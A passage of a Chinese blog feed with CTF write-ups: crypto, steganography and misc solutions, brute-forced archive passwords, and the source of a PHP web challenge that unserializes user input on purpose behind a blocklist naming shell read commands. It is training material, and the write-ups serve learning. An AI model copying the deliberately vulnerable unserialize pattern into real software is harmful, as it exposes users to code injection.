punctuation">:</span>            amount_yi <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>yi<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        amount_float <span class="token operator">+=</span> amount_yi <span class="token operator">*</span> <span class="token number">100000000</span>        amount <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'.+亿'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> amount<span class="token punctuation">,</span> count<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'万'</span> <span class="token keyword">in</span> amount<span class="token punctuation">:</span>        wan <span class="token operator">=</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">r'(.+)万.*'</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        amount_wan <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> chinese_amount<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> wan<span class="token punctuation">:</span>                amount_wan <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>wan<span class="token punctuation">[</span>wan<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> chinese_amount<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">if</span> wan<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> chinese_num<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            amount_wan <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>wan<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        amount_float <span class="token operator">+=</span> amount_wan <span class="token operator">*</span> <span class="token number">10000</span>        amount <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'.+万'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> amount<span class="token punctuation">,</span> count<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    amount_yuan <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> chinese_amount<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> amount<span class="token punctuation">:</span>            <span class="token keyword">if</span> amount<span class="token punctuation">[</span>amount<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> chinese_num<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                amount_yuan <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>amount<span class="token punctuation">[</span>amount<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> chinese_amount<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    amount_float <span class="token operator">+=</span> amount_yuan    <span class="token keyword">return</span> amount_float<span class="token builtin">sum</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">sum</span><span class="token operator">+=</span>aoligeiganle<span class="token punctuation">(</span>price<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span>num_change<span class="token punctuation">(</span>number<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面能是我在另一位大佬哪里找到的exalt的公式…..</p><pre class="line-numbers language-none"><code class="language-none">&#x3D;SUM(ISNUMBER(SEARCH(TEXT(&#123;1,2,3,4,5,6,7,8,9&#125;,&quot;[dbnum2]&quot;&amp;&#123;&quot;0亿&quot;;&quot;0仟!*万&quot;;&quot;0佰!*万&quot;;&quot;0拾!*万&quot;;&quot;0万&quot;;&quot;万!*0仟&quot;;&quot;万!*0佰&quot;;&quot;万!*0拾&quot;;&quot;0元&quot;;&quot;0角&quot;;&quot;0分&quot;&#125;),IF(ISERR(FIND(&quot;万&quot;,A2)),&quot;万&quot;,)&amp;A2))*&#123;1,2,3,4,5,6,7,8,9&#125;*10^&#123;8;7;6;5;4;3;2;1;0;-1;-2&#125;)&#x3D;IF(B3&#x3D;”壹”,1,IF(B3&#x3D;”贰”,2,IF(B3&#x3D;”叁”,3,IF(B3&#x3D;”肆”,4,IF(B3&#x3D;”伍”,5,IF(B3&#x3D;”陆”,6,IF(B3&#x3D;”柒”,7,IF(B3&#x3D;”捌”,8,IF(B3&#x3D;”玖”,9)))))))))  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="双目失明-身残志坚"><a href="#双目失明-身残志坚" class="headerlink" title="双目失明,身残志坚"></a>双目失明,身残志坚</h3><p>看到这个题目还以为是什么神奇的东西，原来是桥本大辉那一脚</p><p>两张图片，同时明显是多了东西，这样应该是图片盲水印，这也符合失明这一点。</p><blockquote><p>Tip  ：<a href="https://github.com/chishaxie/BlindWaterMark">盲水印脚本：</a>与<a href="http://www.manongjc.com/detail/19-creiiewvkgwfziy.html">相关文档</a>，盲水印的题目考察次数倒是蛮多的，还得找题目练一下。</p></blockquote><p>python3命令</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">D:\个人CTFTools\隐写\图像隐写\BlindWaterMark-master&gt;python bwmforpy3.py decode original.png blind.png flag.png -oldseedimage&lt;original.png&gt; + image(encoded)&lt;blind.png&gt; -&gt; watermark&lt;flag.png&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后那张图片是又是盲文，果然是双目失明，身残志坚，这出题人有水平啊。对照<a href="https://blog.csdn.net/weixin_30785593/article/details/96365878">盲文对照表</a>可以发现这个flag实际上就是浙江工业大学的拼音…..</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>菜狗不会，看大佬的吧</p><p>三道re:</p><ul><li><a href="https://www.cnblogs.com/holittech/articles/15335668.html">https://www.cnblogs.com/holittech/articles/15335668.html</a></li><li><a href="https://www.cnblogs.com/holittech/articles/15335673.html">https://www.cnblogs.com/holittech/articles/15335673.html</a></li><li><a href="https://www.cnblogs.com/holittech/articles/15335676.html">https://www.cnblogs.com/holittech/articles/15335676.html</a></li></ul><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>菜狗不会，看大佬的吧</p><ul><li><a href="https://www.cnblogs.com/LynneHuan/p/15335597.html">https://www.cnblogs.com/LynneHuan/p/15335597.html</a></li></ul><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到———-网鼎杯-2020-青龙组-（原题）"><a href="#签到———-网鼎杯-2020-青龙组-（原题）" class="headerlink" title="签到———[网鼎杯 2020 青龙组]（原题）"></a>签到———[网鼎杯 2020 青龙组]（原题）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> randomflag<span class="token operator">=</span><span class="token string">b'flag&#123;******************&#125;'</span>n <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">256</span>flaglong<span class="token operator">=</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>m <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> flaglong<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'m = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># m = 73964803637492582853353338913523546944627084372081477892312545091623069227301</span><span class="token comment"># c = 21572244511100216966799370397791432119463715616349800194229377843045443048821</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实乍一看你会发现他和RSA加密很像，最后的加密过程为c = pow(m, bytes_to_long(flag), n)</p><p>RSA加密就是明文为m，取公钥e和n，密文c=pow(m,e,n)</p><p>这边的一个明显区别为，可以理解为flag明文作为RSA加密里面的公钥e进行的求解。</p><p>这个在密码学里面是基于离散对数的一种加密，我们在求解明文的时候，也就相当于是求解基于同余运算和原根的一种对数运算。</p><p>求解这种问题的话我们用python的sympy模块的discrete_log函数进行求解就可以了。discrete_log(n,c,m)</p><p><strong>解题脚本</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">256</span>m <span class="token operator">=</span> <span class="token number">73964803637492582853353338913523546944627084372081477892312545091623069227301</span>c <span class="token operator">=</span> <span class="token number">21572244511100216966799370397791432119463715616349800194229377843045443048821</span>flag<span class="token operator">=</span>sympy<span class="token punctuation">.</span>discrete_log<span class="token punctuation">(</span>n<span class="token punctuation">,</span>c<span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="hellounser"><a href="#hellounser" class="headerlink" title="hellounser"></a>hellounser</h3><p>题目先放在这里，解题我还没弄出来先放一个<a href="https://www.cnblogs.com/aninock/p/15336101.html">题解</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">arg</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No!No!No!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>            <span class="token comment">//There is no code to print flag in flag.php</span>            <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"Nice Job!!"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$aaa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU靶场解题记录之misc</title>
      <link href="/2021/10/03/BUU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bmisc/"/>
      <url>/2021/10/03/BUU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bmisc/</url>
      
        <content type="html"><![CDATA[<h3 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1. 签到题"></a>1. 签到题</h3><p>说实话，这道题我第一眼真的没看到那个flag在那里，我看到一个链接，加QQ群我以为这道题是类似加公众号之类的，在加群被拒后看到了这个 flag{buu_ctf}</p><h3 id="2-金三胖"><a href="#2-金三胖" class="headerlink" title="2. 金三胖"></a>2. 金三胖</h3><p>这是一张GIF动图，仔细观察在三胖鼓掌的过程中发现闪过了几次奇怪的东西，那应该就是在gif图片里隐藏的flag，使用PS就能简单的分离图层就可以得到flag</p><h3 id="3-二维码"><a href="#3-二维码" class="headerlink" title="3. 二维码"></a>3. 二维码</h3><p>好家伙，确实是个二维码，使用QR扫一遍secret is here，嗯二维码在这里面发送到formost进行分解，得到一个压缩包，通过暴力破解工具得到压缩吧密码7631，解压得到4number.txt文件，flag为：CTF{vjpw_wnoei}</p><h3 id="4-你竟赶我走"><a href="#4-你竟赶我走" class="headerlink" title="4 .  你竟赶我走"></a>4 .  你竟赶我走</h3><p>这个题目名字有点意思啊，是一张图片隐写，实际上是一种最低有效位的问题的隐写，通过stegslve工具使用analyse功能进行分析可以得到flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;stego_is_s0_bor1ing&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-N种方法解决"><a href="#5-N种方法解决" class="headerlink" title="5.N种方法解决"></a>5.N种方法解决</h3><p>好家伙，这道题真经典啊，哪里都有他，这个4kb大小的exe文件实际上是一个假的txt，使用winhex打开看到这个头image/jpg;base64,这个是图片转化为base64编码，解密后又是一张二维码，用工具扫码得到flag</p><pre class="line-numbers language-none"><code class="language-none">KEY&#123;dca57f966e4e4e31fd5b15417da63269&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-大白"><a href="#6-大白" class="headerlink" title="6. 大白"></a>6. 大白</h3><p>这个啊，实际上是一道修改图片高度的问题，还是使用winhex修改图片高度就能得到flag。</p><h3 id="7-基础破解"><a href="#7-基础破解" class="headerlink" title="7. 基础破解"></a>7. 基础破解</h3><p>主要考察暴力密码破解，这个题好在有提示四位数字加密，所以把库限制为从0000到9999就可以很方便的解题</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;70354300a5100ba78068805661b93a5c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-乌镇峰会中图"><a href="#8-乌镇峰会中图" class="headerlink" title="8. 乌镇峰会中图"></a>8. 乌镇峰会中图</h3><p>这道题还是通过stegslve工具使用analyse功能进行分析可以得到flag。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;97314e7864a8f62627b26f3f998c37f1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="9-LSB"><a href="#9-LSB" class="headerlink" title="9.LSB"></a>9.LSB</h3><p>这个名字LSB最低有效位隐写，这个题跟上面两道一样还是使用stegslve工具，在使用stegslve工具查看图片的时候 在<code>Red plane 0</code>、<code>Grenn plane 0</code>、<code>Blue plane0</code>通道发现图片的上方发现存在类似二维码的东西，使用 Data Extract 功能将其保存为一张图片，得到的图片是一张二维码，通过QR工具扫码</p><pre class="line-numbers language-none"><code class="language-none">cumtctf&#123;1sb_i4_s0_Ea4y&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="10-图片中的秘密"><a href="#10-图片中的秘密" class="headerlink" title="10.图片中的秘密"></a>10.图片中的秘密</h3><p>这个秘密在图片的属性里…实际上拿到一张图片隐写题目第一步不就是应该看属性吗？为毛这道题会在这里。</p><h3 id="11-wireshark"><a href="#11-wireshark" class="headerlink" title="11.wireshark"></a>11.wireshark</h3><p>最简单的流量分析，流量分析…..提到流量分析我就像到了之前科来杯预选的那道流量分析，耗了我不知道多久还是没搞出来，这个就好说多了，直接查找关键字flag就能找到好几个流，挨个分析就能找到一个写的</p><pre class="line-numbers language-none"><code class="language-none">email&#x3D;flag&amp;password&#x3D;ffb7567a1d4f4abdffdb54e022f8facd&amp;captcha&#x3D;BYUG<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ffb7567a1d4f4abdffdb54e022f8facd这一段就是flag。</p><h3 id="12-rar"><a href="#12-rar" class="headerlink" title="12.rar"></a>12.rar</h3><p>这道题也是暴力破解，做到这个时候对Buuctf这个靶场的认识是题目丰富，但缺少层次，通过暴力破解得到rar文件的解压密码，解压就能得到flag。</p><h3 id="13-伪加密"><a href="#13-伪加密" class="headerlink" title="13.伪加密"></a>13.伪加密</h3><p>真的是伪加密，关于伪加密这是个大的知识点。<a href="https://blog.csdn.net/qq_26187985/article/details/83654197">zip伪加密原理及操作</a>一个别人的博客，讲的比较清楚，对于这道题来说，看上去是真加密，实际上只是将两个标记位置都改为了0900，还原操作就是单纯将0900改为0000就行。</p><p>14.QR</p><p>题如其名qr，这个是二维码隐写的工具，使用qr扫一遍就行，这个好像说是某个比赛的签到题？</p><pre class="line-numbers language-none"><code class="language-none">欢迎参加本次比赛，密码为 Flag&#123;878865ce73370a4ce607d21ca01b5e59&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="15-被嗅探的流量"><a href="#15-被嗅探的流量" class="headerlink" title="15.被嗅探的流量"></a>15.被嗅探的流量</h3><p>这个是使用wireshark的搜索功能在分组字节流中查找flag，，在看上去被嗅探到的是一个flag.jpg，在查找几次后就找到了，flag{da73d88936010da1eeeb36e945ec4b97}。</p><h3 id="16-镜子里的世界"><a href="#16-镜子里的世界" class="headerlink" title="16.镜子里的世界"></a>16.镜子里的世界</h3><p>又又又又是提到LSB最低有效位隐写还是使用stegslve工具，通过分析得出Hey I th ink we can write  safely in this  file without any one seeing it. A nyway, the secre t key is: st3g0_ saurus_wr3cks</p><p>嗯，这里的flag中又一个空格，我没注意到，捣鼓了老一会。</p><h3 id="17-ningen"><a href="#17-ningen" class="headerlink" title="17.ningen"></a>17.ningen</h3><p>又又又是图片隐写和密码爆破，使用formost分解图片，得到压缩包，使用ARCHPR工具爆破压缩包密码得到flag。</p><p>18.小明的密码箱</p><p>又又又，又是密码爆破直接爆破得到flag{75a3d68bf071ee188c418ea6cf0bb043}</p><h3 id="19-爱因斯坦"><a href="#19-爱因斯坦" class="headerlink" title="19.爱因斯坦"></a>19.爱因斯坦</h3><p>这道题以前做到过，图片使用formost分解得到压缩包，压缩包的密码就在文件的属性里面，不要尝试暴力破解出不来。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;dd22a92bf2cceb6c0cd0d6b83ff51606&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="20-easycap"><a href="#20-easycap" class="headerlink" title="20.easycap"></a>20.easycap</h3><p> 题目附件是流量包，使用<code>wireshark</code>打开，全是<code>tcp</code>的包，追踪流量即可发现flag。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;385b87afc8671dee07550290d16a8071&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="21-另一个世界"><a href="#21-另一个世界" class="headerlink" title="21.另一个世界"></a>21.另一个世界</h3><p>又是一道图片隐写，这道隐写还是老办法使用winhex打开，在ascall码的最后有一段01串，这显然是不正常的，这种情况可以自己去写一个脚本，也可以找现成的工具。我个人还是喜欢在线的平台<a href="http://1818288.com/o/?id=Mzky">二进制转字符串在线平台</a>毕竟用现成的平台可以避免重复造轮子。</p><h3 id="22-隐藏的钥匙"><a href="#22-隐藏的钥匙" class="headerlink" title="22.隐藏的钥匙"></a>22.隐藏的钥匙</h3><p>啊这，这个还是使用winhex打开查找一下flag就出来了………</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;377cbadda1eca2f2f73d36277781f00a&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="23-flag"><a href="#23-flag" class="headerlink" title="23.flag"></a>23.flag</h3><p>嗯，教练我想打篮球，名场面了。 <code>stegsolve</code>打开发现在<code>LSB</code>的<code>RGB</code>这是个<code>zip</code>文件，<code>Save Bin</code>保存为<code>flag.zip</code> ，解压就行，提示损坏课上可以解压的，解压出来是一个没有拓展名的文件1，使用winhex打开，发现是 <code>ELF</code>文件 ，使用<code>IDA</code>打开就能找到flag。</p><h3 id="24-假如给我三天光明"><a href="#24-假如给我三天光明" class="headerlink" title="24.假如给我三天光明"></a>24.假如给我三天光明</h3><p> 下载解压，终于这次不是给你提示让你爆破压缩包了，一张假如给我三天光明的书的图片，上面有一段盲文，通过盲文对照表得到压缩包密码<code>kmdonowg</code>， 把得到的口令输入解压密码，解压得到<code>wav</code>音频文件 ,音频文件的隐写最常见的就是莫斯电码</p><pre class="line-numbers language-none"><code class="language-none">-.-.  -  ..-.  .--  .--.  .  ..  -----  ---..  --...  ...--  ..---  ..--..  ..---  ...--  -..  --..<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于这道题显然这就是莫斯电码，解码得到<code>CTFWPEI08732?23DZ</code>然后就是提交，注意这一堆不止是flag，直接以flag{CTFWPEI08732?23DZ}的形式提交是错误的，需要把CTF换成flag，在把那些大写字母转为小写才行。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;wpei08732?23dz&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
            <tag> Misc </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python上机课汇总</title>
      <link href="/2021/09/29/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E6%9D%8E%E6%98%9F%E4%BA%AE2021,9,15/"/>
      <url>/2021/09/29/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E6%9D%8E%E6%98%9F%E4%BA%AE2021,9,15/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="实验一-：我也不知道这是在干什么"><a href="#实验一-：我也不知道这是在干什么" class="headerlink" title="实验一 ：我也不知道这是在干什么"></a><strong>实验一 ：我也不知道这是在干什么</strong></h2><p>先放一下正常的实验代码吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">l1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span>l1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span>l1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span>l1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"good"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span>l1<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span>l1<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"hello"</span><span class="token 